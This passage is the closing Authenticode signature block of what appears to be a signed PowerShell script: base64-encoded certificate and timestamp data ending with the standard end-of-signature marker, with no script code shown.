# 6Vp0dQ094XmIvxwBl8kZI4DXNlpflhaxYwzGRkA7zl011Fk+Q5oYrsPJy8P7mxNf
# arXH4PMFw1nfJ2Ir3kHJU7n/NBBn9iYymHv+XEKUgZSCnawKi8ZLFUrTmJBFYDOA
# 4CPe+AOk9kVH5c64A0JH6EE2cXet/aLol3ROLtoeHYxayB6a1cLwxiKoT5u92Bya
# UcQvmvZfpyeXupYuhVfAYOd4Vn9q78KVmksRAsiCnMkaBXy6cbVOepls9Oie1FqY
# yJ+/jbsYXEP10Cro4mLueATbvdH7WwqocH7wl4R44wgDXUcsY6glOJcB0j862uXl
# 9uab3H4szP8XTE0AotjWAQ64i+7m4HJViSwnGWH2dwGMMYIE8TCCBO0CAQEwLDAY
# MRYwFAYDVQQDDA1Hb2RGYXRoZXIgSW5jAhA2prNaZ+SrgkKUOf3zdk3pMAkGBSsO
# AwIaBQCgeDAYBgorBgEEAYI3AgEMMQowCKACgAChAoAAMBkGCSqGSIb3DQEJAzEM
# BgorBgEEAYI3AgEEMBwGCisGAQQBgjcCAQsxDjAMBgorBgEEAYI3AgEVMCMGCSqG
# SIb3DQEJBDEWBBQC9icrydpNM+WrC/Du2GNBB2lU2jANBgkqhkiG9w0BAQEFAASC
# AQBoQlXoYo6LBDpS+ov45Z0bM+jyINuXHgUF7bzVqDjfYXDv8lqq07qkJL8f1Htj
# 8l3D/BdognG6tPmGIzIGN6SUSr8//mzKFqkIBCqEngHNaTuCVgYg/G+bsTviKkR0
# /UX+oqHgpfccx5+ykp4jc+Jg9pbhynn/5r3MkSgDF+1MvVLEPM96EniqCrPKLipp
# +OqdyzWwJDO96SVxB7x5rPgAOi6n1BqEfqwdnusV2Dt+nN9HH5TLWM0opRX+cB+D
# 84MySxQ0HTRZpwU7OEqc+NyWxYr+h6pxshc/BIL5OXlIgVHNxd1RtVGirEVe2Q9T
# V3Z/aQwh+FjivfM3ujnWhxLGoYIDIDCCAxwGCSqGSIb3DQEJBjGCAw0wggMJAgEB
# MHcwYzELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRpZ2lDZXJ0LCBJbmMuMTswOQYD
# VQQDEzJEaWdpQ2VydCBUcnVzdGVkIEc0IFJTQTQwOTYgU0hBMjU2IFRpbWVTdGFt
# cGluZyBDQQIQDE1pckuU+jwqSj0pB4A9WjANBglghkgBZQMEAgEFAKBpMBgGCSqG
# SIb3DQEJAzELBgkqhkiG9w0BBwEwHAYJKoZIhvcNAQkFMQ8XDTIzMDUzMTAyNTMx
# OVowLwYJKoZIhvcNAQkEMSIEIEFitgPW9gLELCdjUAzCpjfHsyrNwz/P3SxkEqgo
# MPJcMA0GCSqGSIb3DQEBAQUABIICADw7ocr8+MWSPGrFaPCp4VQi3k6sOrYdhkxE
# wobJxlQtzJ+WniOQCqp2e7d93Q19xfzQiIznEsJOgRF1g6mVOeK8GNuacwknIjck
# lQOCW/NzLc0rmOFiUfXRgB+1OqNh/63fBe7YC5q5s+M5JbkcZmTp+Yyys7NmGwf5
# lQtF+Z7AdpgjpZbr0KgfTrWQm81umQYxWGVh9LSMox04v7is9lrt6Tmcr73rieKT
# ARwWxB6Y5veqy9XTI1v9Ifh/oLaq/xUEMA1nYfKV0ozvB6EjavXuFVqdB8Cp4QRn
# TgyTHiWirKj+oS70o/QAshElGJUJpy0FyP7bCy4iS0B9/fGtVs+wuMqdcvF0HWSW
# SUHaqDLPAoroSHRIGWJiD7JbbMgNShqnL0hVHmwjrz5sx5uMfgQLe9QtnPT2s4I9
# 47VATfB1LAg7v3ZRx1hUoJle+JQ4WJa5ZXjJ4S/sz/1uR9yo1mIPShcchH0+/fDM
# cDtMU3aW53JnbRPyFOGvBHb0qz9nICNgxfr9psESHCcmXxct4kg4Um7CuSgViifi
# 0CWqFf3EQPT0cNQwQnyyHNAWtKjqa5L/nkJVmwT0q669r6ItS3iO0ArkxrXkipTj
# g8ZGUmxSTUS4V92G2KrYtA5EnKpp0WEzfCOqA+xOd4uMbiXqGtJ8RkboZrEk/tVi
# bDfISmWw
# SIG # End signature block
